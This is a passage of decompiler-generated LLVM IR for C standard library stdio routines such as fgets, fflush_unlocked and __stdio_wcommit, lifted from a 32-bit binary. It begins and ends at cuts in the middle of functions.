; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %ebx.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder label %dec_label_pc_804cea7, { 1, 0 }
  uselistorder label %dec_label_pc_804ce96, { 1, 0 }
  uselistorder label %dec_label_pc_804ce74, { 1, 0 }
  uselistorder label %dec_label_pc_804ce4d, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_804ceb4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804cebc = add i32 %arg1, 8
  %v2_804cebc = inttoptr i32 %v1_804cebc to i32*
  %v3_804cebc = load i32, i32* %v2_804cebc, align 4
  store i32 %v3_804cebc, i32* %edx.global-to-local, align 4
  %v1_804cebf = add i32 %arg1, 16
  %v2_804cebf = inttoptr i32 %v1_804cebf to i32*
  %v3_804cebf = load i32, i32* %v2_804cebf, align 4
  %v2_804cec2 = sub i32 %v3_804cebf, %v3_804cebc
  %v12_804cec2 = icmp eq i32 %v2_804cec2, 0
  store i32 %v2_804cec2, i32* %eax.global-to-local, align 4
  br i1 %v12_804cec2, label %dec_label_pc_804ced5, label %dec_label_pc_804cec6

dec_label_pc_804cec6:                             ; preds = %entry
  store i32 %v3_804cebc, i32* %v2_804cebf, align 4
  %v0_804cec9 = load i32, i32* @ecx, align 4
  %v0_804ceca = load i32, i32* %eax.global-to-local, align 4
  %v0_804cecb = load i32, i32* %edx.global-to-local, align 4
  %v0_804cecc = load i32, i32* @ebx, align 4
  %v4_804cecd = inttoptr i32 %v0_804cecc to i16*
  %v5_804cecd = call i32 @__stdio_WRITE(i16* %v4_804cecd, i32 %v0_804cecb, i32 %v0_804ceca, i32 %v0_804cec9)
  store i32 %v5_804cecd, i32* %eax.global-to-local, align 4
  %v0_804ced5.pre = load i32, i32* @ebx, align 4
  %v2_804cedb.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804ced5

dec_label_pc_804ced5:                             ; preds = %entry, %dec_label_pc_804cec6
  %v2_804cedb = phi i32 [ %tmp11, %entry ], [ %v2_804cedb.pre, %dec_label_pc_804cec6 ]
  %v0_804ced5 = phi i32 [ %arg1, %entry ], [ %v0_804ced5.pre, %dec_label_pc_804cec6 ]
  %v1_804ced5 = add i32 %v0_804ced5, 16
  %v2_804ced5 = inttoptr i32 %v1_804ced5 to i32*
  %v3_804ced5 = load i32, i32* %v2_804ced5, align 4
  store i32 %v3_804ced5, i32* %eax.global-to-local, align 4
  %v2_804ced8 = add i32 %v0_804ced5, 8
  %v3_804ced8 = inttoptr i32 %v2_804ced8 to i32*
  %v4_804ced8 = load i32, i32* %v3_804ced8, align 4
  %v5_804ced8 = sub i32 %v3_804ced5, %v4_804ced8
  store i32 %v5_804ced8, i32* %eax.global-to-local, align 4
  store i32 %v2_804cedb, i32* @edx, align 4
  store i32 %v0_804ceb4, i32* @ebx, align 4
  ret i32 %v5_804ced8

; uselistorder directives
  uselistorder i32 %v0_804ced5, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804ced5, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804cee0 = load i32, i32* @edi, align 4
  %v0_804cee1 = load i32, i32* @esi, align 4
  %v0_804cee2 = load i32, i32* @ebx, align 4
  %v12_804cee3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @esi, align 4
  %v1_804ceea = add i32 %arg3, 52
  %v2_804ceea = inttoptr i32 %v1_804ceea to i32*
  %v3_804ceea = load i32, i32* %v2_804ceea, align 4
  store i32 %v3_804ceea, i32* @edi, align 4
  %v1_804ceed = icmp eq i32 %v3_804ceea, 0
  %v1_804ceef = icmp eq i1 %v1_804ceed, false
  br i1 %v1_804ceef, label %entry.dec_label_pc_804cf10_crit_edge, label %dec_label_pc_804cef1

entry.dec_label_pc_804cf10_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804cf10

dec_label_pc_804cef1:                             ; preds = %entry
  %v1_804cef1 = add i32 %arg3, 56
  store i32 %v1_804cef1, i32* @ebx, align 4
  store i32 %v12_804cee3, i32* @eax, align 4
  %v2_804cf00 = call i32 @__pthread_return_void(i32 %v12_804cee3, i32 134526871)
  %v0_804cf05 = load i32, i32* @ebx, align 4
  %v1_804cf08 = call i32 @__pthread_return_0(i32 %v0_804cf05)
  %v0_804cf11.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804cf10

dec_label_pc_804cf10:                             ; preds = %entry.dec_label_pc_804cf10_crit_edge, %dec_label_pc_804cef1
  %v0_804cf11 = phi i32 [ %arg3, %entry.dec_label_pc_804cf10_crit_edge ], [ %v0_804cf11.pre, %dec_label_pc_804cef1 ]
  %v0_804cf10 = load i32, i32* @edx, align 4
  %v4_804cf1a = inttoptr i32 %arg1 to i8*
  %v5_804cf1a = call i32 @__GI_fgets_unlocked(i8* %v4_804cf1a, i32 %arg2, i32 %v0_804cf11, i32 %v0_804cf10)
  store i32 %v5_804cf1a, i32* %ebx.global-to-local, align 4
  br i1 %v1_804ceef, label %dec_label_pc_804cf39, label %dec_label_pc_804cf28

dec_label_pc_804cf28:                             ; preds = %dec_label_pc_804cf10
  store i32 %v12_804cee3, i32* @eax, align 4
  %v2_804cf31 = call i32 @__pthread_return_void(i32 %v12_804cee3, i32 1)
  %v0_804cf3c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804cf39

dec_label_pc_804cf39:                             ; preds = %dec_label_pc_804cf10, %dec_label_pc_804cf28
  %v0_804cf3c = phi i32 [ %v5_804cf1a, %dec_label_pc_804cf10 ], [ %v0_804cf3c.pre, %dec_label_pc_804cf28 ]
  store i32 %v0_804cee2, i32* @ebx, align 4
  store i32 %v0_804cee1, i32* @esi, align 4
  store i32 %v0_804cee0, i32* @edi, align 4
  ret i32 %v0_804cf3c

; uselistorder directives
  uselistorder i32 %v12_804cee3, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804cf39, { 1, 0 }
  uselistorder label %dec_label_pc_804cf10, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_804cf53 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804cf53, i32* @eax, align 4
  %v2_804cf58 = call i32 @__pthread_return_void(i32 %v2_804cf53, i32 134526871)
  %v1_804cf64 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80521a8.98 to i32))
  %v0_804cf69 = load i32, i32* @global_var_8052548.99, align 8
  %v8_804cf71 = icmp eq i32 %v0_804cf69, 1
  %v1_804cf72 = icmp eq i1 %v8_804cf71, false
  br i1 %v1_804cf72, label %dec_label_pc_804d009, label %dec_label_pc_804cf78

dec_label_pc_804cf78:                             ; preds = %entry
  %v0_804cf78 = load i32, i32* @global_var_805254c.100, align 4
  %tmp29 = icmp slt i32 %v0_804cf78, 1
  br i1 %tmp29, label %dec_label_pc_804d009, label %dec_label_pc_804cf85

dec_label_pc_804cf85:                             ; preds = %dec_label_pc_804cf78
  store i32 0, i32* @esi, align 4
  %v2_804cf92 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_804cf92, i32* @eax, align 4
  %v2_804cf97 = call i32 @__pthread_return_void(i32 %v2_804cf92, i32 134526871)
  %v1_804cfa3 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052190.102 to i32))
  %v0_804cfa8 = load i32, i32* bitcast (i32** @global_var_805218c.104 to i32*), align 4
  store i32 %v0_804cfa8, i32* %edx.global-to-local, align 4
  %v1_804cfea3 = icmp eq i32 %v0_804cfa8, 0
  %v1_804cfec10 = icmp eq i1 %v1_804cfea3, false
  br i1 %v1_804cfec10, label %dec_label_pc_804cfb3, label %dec_label_pc_804cfee

dec_label_pc_804cfb3:                             ; preds = %dec_label_pc_804cf85, %dec_label_pc_804cfe8
  %v1_804cfb314.in = phi i32 [ %v0_804cfe8, %dec_label_pc_804cfe8 ], [ %v0_804cfa8, %dec_label_pc_804cf85 ]
  %v1_804cfb314 = inttoptr i32 %v1_804cfb314.in to i16*
  %v2_804cfb3 = load i16, i16* %v1_804cfb314, align 2
  %v1_804cfb6 = add i32 %v1_804cfb314.in, 32
  %v2_804cfb6 = inttoptr i32 %v1_804cfb6 to i32*
  %v3_804cfb6 = load i32, i32* %v2_804cfb6, align 4
  store i32 %v3_804cfb6, i32* @ebx, align 4
  %v1_804cfb9 = and i16 %v2_804cfb3, -32720
  %v6_804cfbe = icmp eq i16 %v1_804cfb9, 48
  br i1 %v6_804cfbe, label %dec_label_pc_804cfc7, label %dec_label_pc_804cfc3

dec_label_pc_804cfc3:                             ; preds = %dec_label_pc_804cfb3
  store i32 %v1_804cfb314.in, i32* @esi, align 4
  br label %dec_label_pc_804cfe8

dec_label_pc_804cfc7:                             ; preds = %dec_label_pc_804cfb3
  %v0_804cfc7 = load i32, i32* @esi, align 4
  %v1_804cfc7 = icmp eq i32 %v0_804cfc7, 0
  %v1_804cfc9 = icmp eq i1 %v1_804cfc7, false
  br i1 %v1_804cfc9, label %dec_label_pc_804cfd3, label %dec_label_pc_804cfcb

dec_label_pc_804cfcb:                             ; preds = %dec_label_pc_804cfc7
  store i32 %v3_804cfb6, i32* bitcast (i32** @global_var_805218c.104 to i32*), align 4
  br label %dec_label_pc_804cfd6

dec_label_pc_804cfd3:                             ; preds = %dec_label_pc_804cfc7
  %v2_804cfd3 = add i32 %v0_804cfc7, 32
  %v3_804cfd3 = inttoptr i32 %v2_804cfd3 to i32*
  store i32 %v3_804cfb6, i32* %v3_804cfd3, align 4
  %v0_804cfd6.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804cfd6

dec_label_pc_804cfd6:                             ; preds = %dec_label_pc_804cfcb, %dec_label_pc_804cfd3
  %v0_804cfdf = phi i32 [ %v1_804cfb314.in, %dec_label_pc_804cfcb ], [ %v0_804cfd6.pre, %dec_label_pc_804cfd3 ]
  %v1_804cfd6 = add i32 %v0_804cfdf, 1
  %v2_804cfd6 = inttoptr i32 %v1_804cfd6 to i8*
  %v3_804cfd6 = load i8, i8* %v2_804cfd6, align 1
  %v4_804cfd6 = and i8 %v3_804cfd6, 32
  %v5_804cfd6 = icmp eq i8 %v4_804cfd6, 0
  br i1 %v5_804cfd6, label %dec_label_pc_804cfe8, label %dec_label_pc_804cfdc

dec_label_pc_804cfdc:                             ; preds = %dec_label_pc_804cfd6
  %v1_804cfe0 = call i32 @free(i32 %v0_804cfdf)
  br label %dec_label_pc_804cfe8

dec_label_pc_804cfe8:                             ; preds = %dec_label_pc_804cfd6, %dec_label_pc_804cfc3, %dec_label_pc_804cfdc
  %v0_804cfe8 = load i32, i32* @ebx, align 4
  store i32 %v0_804cfe8, i32* %edx.global-to-local, align 4
  %v1_804cfea = icmp eq i32 %v0_804cfe8, 0
  %v1_804cfec = icmp eq i1 %v1_804cfea, false
  br i1 %v1_804cfec, label %dec_label_pc_804cfb3, label %dec_label_pc_804cfee

dec_label_pc_804cfee:                             ; preds = %dec_label_pc_804cfe8, %dec_label_pc_804cf85
  store i32 %v2_804cf92, i32* @eax, align 4
  %v2_804cff7 = call i32 @__pthread_return_void(i32 %v2_804cf92, i32 1)
  store i32 0, i32* @global_var_805254c.100, align 4
  %v0_804d009.pre = load i32, i32* @global_var_8052548.99, align 8
  br label %dec_label_pc_804d009

dec_label_pc_804d009:                             ; preds = %dec_label_pc_804cf78, %entry, %dec_label_pc_804cfee
  %v0_804d009 = phi i32 [ %v0_804cf69, %dec_label_pc_804cf78 ], [ %v0_804cf69, %entry ], [ %v0_804d009.pre, %dec_label_pc_804cfee ]
  %v1_804d00e = add i32 %v0_804d009, -1
  store i32 %v1_804d00e, i32* @global_var_8052548.99, align 8
  store i32 %v2_804cf53, i32* @eax, align 4
  %v2_804d01d = call i32 @__pthread_return_void(i32 %v2_804cf53, i32 1)
  ret i32 %v2_804d01d

; uselistorder directives
  uselistorder i32 %v0_804cfe8, { 1, 2, 0 }
  uselistorder i32 %v1_804cfb314.in, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804cf69, { 1, 2, 0 }
  uselistorder i32 (i32)* @free, { 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 1, 7, 6, 5, 4, 3, 20, 19, 2, 0 }
  uselistorder label %dec_label_pc_804d009, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cfe8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804cfd6, { 1, 0 }
  uselistorder label %dec_label_pc_804cfb3, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v0_804d028 = load i32, i32* @ebp, align 4
  store i32 0, i32* @ebp, align 4
  %v0_804d02b = load i32, i32* @edi, align 4
  %v0_804d02c = load i32, i32* @esi, align 4
  %v0_804d02d = load i32, i32* @ebx, align 4
  %v4_804d031 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804d031, i32* @ebx, align 4
  %v10_804d035 = icmp eq i16* %arg1, inttoptr (i32 134553996 to i16*)
  br i1 %v10_804d035, label %dec_label_pc_804d049, label %dec_label_pc_804d03d

dec_label_pc_804d03d:                             ; preds = %entry
  %v2_804d03d = icmp eq i16* %arg1, null
  store i32 256, i32* @ebp, align 4
  %v1_804d043 = icmp eq i1 %v2_804d03d, false
  br i1 %v1_804d043, label %dec_label_pc_804d141, label %dec_label_pc_804d049

dec_label_pc_804d049:                             ; preds = %dec_label_pc_804d03d, %entry
  store i32 0, i32* @edi, align 4
  %v2_804d056 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804d056, i32* @ebx, align 4
  %v2_804d05b = call i32 @__pthread_return_void(i32 %v2_804d056, i32 134526871)
  %v1_804d067 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80521a8.98 to i32))
  %v0_804d06c = load i32, i32* @global_var_8052548.99, align 8
  store i32 ptrtoint (i32* @global_var_80521a8.98 to i32), i32* @ecx, align 4
  %v1_804d073 = add i32 %v0_804d06c, 1
  store i32 %v1_804d073, i32* @eax, align 4
  store i32 %v1_804d073, i32* @global_var_8052548.99, align 8
  %v2_804d07c = call i32 @__pthread_return_void(i32 %v2_804d056, i32 1)
  store i32 %v2_804d07c, i32* @eax, align 4
  %v2_804d08f = call i32 @__pthread_return_void(i32 %v2_804d056, i32 134526871)
  %v1_804d09b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052190.102 to i32))
  %v0_804d0a0 = load i32, i32* bitcast (i32** @global_var_805218c.104 to i32*), align 4
  store i32 %v0_804d0a0, i32* @esi, align 4
  store i32 ptrtoint (i32* @global_var_8052190.102 to i32), i32* @eax, align 4
  %v2_804d0ab = call i32 @__pthread_return_void(i32 %v2_804d056, i32 1)
  %v0_804d1321 = load i32, i32* @esi, align 4
  %v1_804d1322 = icmp eq i32 %v0_804d1321, 0
  %v1_804d1349 = icmp eq i1 %v1_804d1322, false
  br i1 %v1_804d1349, label %dec_label_pc_804d0b5, label %dec_label_pc_804d13a

dec_label_pc_804d0b5:                             ; preds = %dec_label_pc_804d049, %dec_label_pc_804d12f
  %v0_804d0c3 = phi i32 [ %v3_804d12f, %dec_label_pc_804d12f ], [ %v0_804d1321, %dec_label_pc_804d049 ]
  %v1_804d0b5 = inttoptr i32 %v0_804d0c3 to i8*
  %v2_804d0b5 = load i8, i8* %v1_804d0b5, align 1
  %v3_804d0b5 = and i8 %v2_804d0b5, 64
  %v4_804d0b5 = icmp eq i8 %v3_804d0b5, 0
  br i1 %v4_804d0b5, label %dec_label_pc_804d12f, label %dec_label_pc_804d0ba

dec_label_pc_804d0ba:                             ; preds = %dec_label_pc_804d0b5
  %v0_804d0ba = load i32, i32* @global_var_80521c0.101, align 64
  %v9_804d0ba = icmp eq i32 %v0_804d0ba, 2
  br i1 %v9_804d0ba, label %dec_label_pc_804d0e2, label %dec_label_pc_804d0c3

dec_label_pc_804d0c3:                             ; preds = %dec_label_pc_804d0ba
  %v1_804d0c3 = add i32 %v0_804d0c3, 56
  store i32 %v1_804d0c3, i32* @ebx, align 4
  store i32 %v2_804d056, i32* @eax, align 4
  %v2_804d0d2 = call i32 @__pthread_return_void(i32 %v2_804d056, i32 134526871)
  %v0_804d0d7 = load i32, i32* @ebx, align 4
  %v1_804d0da = call i32 @__pthread_return_0(i32 %v0_804d0d7)
  %v0_804d0e2.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804d0e2

dec_label_pc_804d0e2:                             ; preds = %dec_label_pc_804d0ba, %dec_label_pc_804d0c3
  %v0_804d0f5 = phi i32 [ %v0_804d0c3, %dec_label_pc_804d0ba ], [ %v0_804d0e2.pre, %dec_label_pc_804d0c3 ]
  %v1_804d0e2 = inttoptr i32 %v0_804d0f5 to i32*
  %v2_804d0e2 = load i32, i32* %v1_804d0e2, align 4
  %v1_804d0e4 = load i32, i32* @ebp, align 4
  %v2_804d0e4 = or i32 %v1_804d0e4, %v2_804d0e2
  %v1_804d0e6 = and i32 %v2_804d0e4, 832
  %v2_804d0eb = icmp eq i32 %v1_804d0e6, 320
  %v1_804d0f0 = icmp eq i1 %v2_804d0eb, false
  br i1 %v1_804d0f0, label %dec_label_pc_804d115, label %dec_label_pc_804d0f2

dec_label_pc_804d0f2:                             ; preds = %dec_label_pc_804d0e2
  %v1_804d0f6 = call i32 @__stdio_wcommit(i32 %v0_804d0f5)
  %v1_804d0fe = icmp eq i32 %v1_804d0f6, 0
  br i1 %v1_804d0fe, label %dec_label_pc_804d107, label %dec_label_pc_804d102

dec_label_pc_804d102:                             ; preds = %dec_label_pc_804d0f2
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804d115

dec_label_pc_804d107:                             ; preds = %dec_label_pc_804d0f2
  %v0_804d107 = load i32, i32* @esi, align 4
  %v1_804d107 = add i32 %v0_804d107, 8
  %v2_804d107 = inttoptr i32 %v1_804d107 to i32*
  %v3_804d107 = load i32, i32* %v2_804d107, align 4
  %v2_804d10a = add i32 %v0_804d107, 28
  %v3_804d10a = inttoptr i32 %v2_804d10a to i32*
  store i32 %v3_804d107, i32* %v3_804d10a, align 4
  %v0_804d10d = load i32, i32* @esi, align 4
  %v1_804d10d = inttoptr i32 %v0_804d10d to i32*
  %v2_804d10d = load i32, i32* %v1_804d10d, align 4
  %v2_804d10d.tr = trunc i32 %v2_804d10d to i16
  %v1_804d112 = and i16 %v2_804d10d.tr, -65
  %v3_804d112 = inttoptr i32 %v0_804d10d to i16*
  store i16 %v1_804d112, i16* %v3_804d112, align 2
  br label %dec_label_pc_804d115

dec_label_pc_804d115:                             ; preds = %dec_label_pc_804d0e2, %dec_label_pc_804d102, %dec_label_pc_804d107
  %v0_804d115 = load i32, i32* @global_var_80521c0.101, align 64
  %v9_804d115 = icmp eq i32 %v0_804d115, 2
  br i1 %v9_804d115, label %dec_label_pc_804d12f, label %dec_label_pc_804d11e

dec_label_pc_804d11e:                             ; preds = %dec_label_pc_804d115
  store i32 %v2_804d056, i32* @eax, align 4
  %v2_804d127 = call i32 @__pthread_return_void(i32 %v2_804d056, i32 1)
  br label %dec_label_pc_804d12f

dec_label_pc_804d12f:                             ; preds = %dec_label_pc_804d115, %dec_label_pc_804d0b5, %dec_label_pc_804d11e
  %v0_804d12f = load i32, i32* @esi, align 4
  %v1_804d12f = add i32 %v0_804d12f, 32
  %v2_804d12f = inttoptr i32 %v1_804d12f to i32*
  %v3_804d12f = load i32, i32* %v2_804d12f, align 4
  store i32 %v3_804d12f, i32* @esi, align 4
  %v1_804d132 = icmp eq i32 %v3_804d12f, 0
  %v1_804d134 = icmp eq i1 %v1_804d132, false
  br i1 %v1_804d134, label %dec_label_pc_804d0b5, label %dec_label_pc_804d13a

dec_label_pc_804d13a:                             ; preds = %dec_label_pc_804d12f, %dec_label_pc_804d049
  %v0_804d13a = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_804d16b

dec_label_pc_804d141:                             ; preds = %dec_label_pc_804d03d
  store i32 0, i32* @edi, align 4
  %tmp23 = bitcast i16* %arg1 to i8*
  %v3_804d143 = load i8, i8* %tmp23, align 1
  %v4_804d143 = and i8 %v3_804d143, 64
  %v5_804d143 = icmp eq i8 %v4_804d143, 0
  br i1 %v5_804d143, label %dec_label_pc_804d16b, label %dec_label_pc_804d148

dec_label_pc_804d148:                             ; preds = %dec_label_pc_804d141
  store i32 -1, i32* @edi, align 4
  %v1_804d14f = call i32 @__stdio_wcommit(i32 %v4_804d031)
  %v1_804d157 = icmp eq i32 %v1_804d14f, 0
  %v1_804d159 = icmp eq i1 %v1_804d157, false
  br i1 %v1_804d159, label %dec_label_pc_804d16b, label %dec_label_pc_804d15b

dec_label_pc_804d15b:                             ; preds = %dec_label_pc_804d148
  %v2_804d15b = add i32 %v4_804d031, 8
  %v3_804d15b = inttoptr i32 %v2_804d15b to i32*
  %v4_804d15b = load i32, i32* %v3_804d15b, align 4
  store i32 0, i32* @edi, align 4
  %v3_804d160 = add i32 %v4_804d031, 28
  %v4_804d160 = inttoptr i32 %v3_804d160 to i32*
  store i32 %v4_804d15b, i32* %v4_804d160, align 4
  %tmp24 = bitcast i16* %arg1 to i32*
  %v3_804d163 = load i32, i32* %tmp24, align 4
  %v3_804d163.tr = trunc i32 %v3_804d163 to i16
  %v1_804d168 = and i16 %v3_804d163.tr, -65
  store i16 %v1_804d168, i16* %arg1, align 2
  br label %dec_label_pc_804d16b

dec_label_pc_804d16b:                             ; preds = %dec_label_pc_804d148, %dec_label_pc_804d141, %dec_label_pc_804d13a, %dec_label_pc_804d15b
  %v0_804d16e = load i32, i32* @edi, align 4
  store i32 %v0_804d02d, i32* @ebx, align 4
  store i32 %v0_804d02c, i32* @esi, align 4
  store i32 %v0_804d02b, i32* @edi, align 4
  store i32 %v0_804d028, i32* @ebp, align 4
  ret i32 %v0_804d16e

; uselistorder directives
  uselistorder i32 %v3_804d12f, { 1, 2, 0 }
  uselistorder i32 %v2_804d056, { 2, 3, 0, 1, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_805218c.104 to i32*), { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32* @global_var_8052548.99, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_80521a8.98 to i32), { 1, 3, 4, 5, 6, 9, 2, 7, 0, 8 }
  uselistorder i16* %arg1, { 3, 1, 4, 2, 0, 5 }
  uselistorder label %dec_label_pc_804d16b, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804d12f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d115, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d0e2, { 1, 0 }
  uselistorder label %dec_label_pc_804d0b5, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_804d178 = load i32, i32* @ebp, align 4
  %v4_804d183 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804d183, i32* @edi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %v4_804d183, i32* @ebx, align 4
  %tmp16 = icmp slt i32 %arg2, 1
  %tmp17 = icmp eq i1 %tmp16, false
  br i1 %tmp17, label %dec_label_pc_804d1c9.preheader, label %dec_label_pc_804d1d5

dec_label_pc_804d1c9.preheader:                   ; preds = %entry
  %v1_804d1c918 = add i32 %arg2, -1
  %v8_804d1c919 = icmp eq i32 %v1_804d1c918, 0
  store i32 %v1_804d1c918, i32* @esi, align 4
  %v1_804d1ca21 = icmp eq i1 %v8_804d1c919, false
  br i1 %v1_804d1ca21, label %dec_label_pc_804d193, label %dec_label_pc_804d1cc

dec_label_pc_804d193:                             ; preds = %dec_label_pc_804d1c9.preheader, %dec_label_pc_804d1c7.dec_label_pc_804d1c9_crit_edge.dec_label_pc_804d193_crit_edge
  %v0_804d193 = phi i32 [ %v0_804d193.pre, %dec_label_pc_804d1c7.dec_label_pc_804d1c9_crit_edge.dec_label_pc_804d193_crit_edge ], [ %arg3, %dec_label_pc_804d1c9.preheader ]
  %v1_804d193 = add i32 %v0_804d193, 16
  %v2_804d193 = inttoptr i32 %v1_804d193 to i32*
  %v3_804d193 = load i32, i32* %v2_804d193, align 4
  store i32 %v3_804d193, i32* %eax.global-to-local, align 4
  %v2_804d196 = add i32 %v0_804d193, 24
  %v3_804d196 = inttoptr i32 %v2_804d196 to i32*
  %v4_804d196 = load i32, i32* %v3_804d196, align 4
  %v10_804d196 = icmp ult i32 %v3_804d193, %v4_804d196
  %v1_804d199 = icmp eq i1 %v10_804d196, false
  br i1 %v1_804d199, label %dec_label_pc_804d1a9, label %dec_label_pc_804d19b

dec_label_pc_804d19b:                             ; preds = %dec_label_pc_804d193
  %v1_804d19b = inttoptr i32 %v3_804d193 to i8*
  %v2_804d19b = load i8, i8* %v1_804d19b, align 1
  %v3_804d19b = zext i8 %v2_804d19b to i32
  %v4_804d19b = load i32, i32* @edx, align 4
  %v5_804d19b = and i32 %v4_804d19b, -256
  %v6_804d19b = or i32 %v5_804d19b, %v3_804d19b
  store i32 %v6_804d19b, i32* @edx, align 4
  %v1_804d19d = add i32 %v3_804d193, 1
  store i32 %v1_804d19d, i32* %eax.global-to-local, align 4
  %v2_804d19e = load i32, i32* @ebx, align 4
  %v3_804d19e = inttoptr i32 %v2_804d19e to i8*
  store i8 %v2_804d19b, i8* %v3_804d19e, align 1
  %v0_804d1a0 = load i32, i32* @ebx, align 4
  %v1_804d1a0 = add i32 %v0_804d1a0, 1
  store i32 %v1_804d1a0, i32* @ebx, align 4
  %v0_804d1a1 = load i32, i32* @edx, align 4
  %v1_804d1a1 = trunc i32 %v0_804d1a1 to i8
  %v10_804d1a1 = icmp eq i8 %v1_804d1a1, 10
  %v0_804d1a4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d1a4 = load i32, i32* @ebp, align 4
  %v2_804d1a4 = add i32 %v1_804d1a4, 16
  %v3_804d1a4 = inttoptr i32 %v2_804d1a4 to i32*
  store i32 %v0_804d1a4, i32* %v3_804d1a4, align 4
  br i1 %v10_804d1a1, label %dec_label_pc_804d1cc, label %dec_label_pc_804d1c7.dec_label_pc_804d1c9_crit_edge

dec_label_pc_804d1a9:                             ; preds = %dec_label_pc_804d193
  %v0_804d1ad = call i32 @getc_unlocked()
  %v1_804d1ad = trunc i32 %v0_804d1ad to i8
  store i32 %v0_804d1ad, i32* %eax.global-to-local, align 4
  %sext.mask = urem i32 %v0_804d1ad, 256
  %v11_804d1b5 = icmp eq i32 %sext.mask, 255
  %v1_804d1b8 = icmp eq i1 %v11_804d1b5, false
  br i1 %v1_804d1b8, label %dec_label_pc_804d1c7, label %dec_label_pc_804d1ba

dec_label_pc_804d1ba:                             ; preds = %dec_label_pc_804d1a9
  %v0_804d1ba = load i32, i32* @ebp, align 4
  %v1_804d1ba = inttoptr i32 %v0_804d1ba to i8*
  %v2_804d1ba = load i8, i8* %v1_804d1ba, align 1
  %v3_804d1ba = and i8 %v2_804d1ba, 8
  %v4_804d1ba = icmp eq i8 %v3_804d1ba, 0
  br i1 %v4_804d1ba, label %dec_label_pc_804d1cc, label %dec_label_pc_804d1d5

dec_label_pc_804d1c7:                             ; preds = %dec_label_pc_804d1a9
  %v3_804d1c2 = load i32, i32* @ebx, align 4
  %v4_804d1c2 = inttoptr i32 %v3_804d1c2 to i8*
  store i8 %v1_804d1ad, i8* %v4_804d1c2, align 1
  %v0_804d1c4 = load i32, i32* @ebx, align 4
  %v1_804d1c4 = add i32 %v0_804d1c4, 1
  store i32 %v1_804d1c4, i32* @ebx, align 4
  %v11_804d1c5 = icmp eq i8 %v1_804d1ad, 10
  br i1 %v11_804d1c5, label %dec_label_pc_804d1cc, label %dec_label_pc_804d1c7.dec_label_pc_804d1c9_crit_edge

dec_label_pc_804d1c7.dec_label_pc_804d1c9_crit_edge: ; preds = %dec_label_pc_804d19b, %dec_label_pc_804d1c7
  %v0_804d1c9.pre = load i32, i32* @esi, align 4
  %v1_804d1c9 = add i32 %v0_804d1c9.pre, -1
  %v8_804d1c9 = icmp eq i32 %v1_804d1c9, 0
  store i32 %v1_804d1c9, i32* @esi, align 4
  %v1_804d1ca = icmp eq i1 %v8_804d1c9, false
  br i1 %v1_804d1ca, label %dec_label_pc_804d1c7.dec_label_pc_804d1c9_crit_edge.dec_label_pc_804d193_crit_edge, label %dec_label_pc_804d1cc

dec_label_pc_804d1c7.dec_label_pc_804d1c9_crit_edge.dec_label_pc_804d193_crit_edge: ; preds = %dec_label_pc_804d1c7.dec_label_pc_804d1c9_crit_edge
  %v0_804d193.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804d193

